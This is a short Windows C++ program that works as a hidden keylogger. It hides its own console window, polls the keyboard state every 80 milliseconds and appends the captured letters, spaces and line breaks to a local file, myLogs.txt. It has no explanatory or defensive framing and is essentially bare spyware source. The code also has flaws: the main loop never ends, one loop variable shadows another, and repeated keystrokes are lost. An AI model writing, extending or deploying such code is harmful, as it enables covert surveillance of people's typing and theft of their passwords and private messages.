#pragma warning(disable:4996)
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void doIt(string input)
{
	FILE* pFile = fopen("myLogs.txt", "a");
	fprintf(pFile, "%s\n", input.c_str());
	fclose(pFile);
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	int i = 200;
	string prev = "";
	string outPut = "";

	while (i != 1000) {
		Sleep(80);
		string text = "";	

		for (int i = 'A'; i <= 'z'; i++) 
		{
			if ((GetKeyState(i) & 0x8000) || (GetKeyState(VK_SPACE) & 0x8000) || (GetKeyState(VK_RETURN) & 0x8000))
			{
				text = (char)i;
				if ((GetKeyState(VK_SPACE) & 0x8000))
					text = " ";

				if ((GetKeyState(VK_RETURN) & 0x8000)) 
					text = "\n";
					

				if (text != prev) {
					outPut += text;
					prev = text;
				}
			}
		}
		if (text == "\n") 
		{
			doIt(outPut);
			outPut = "";
		}

		if (outPut.length() >= 100)
		{
			doIt(outPut);
			outPut = "";
		}
			
	}

	return 0;
}
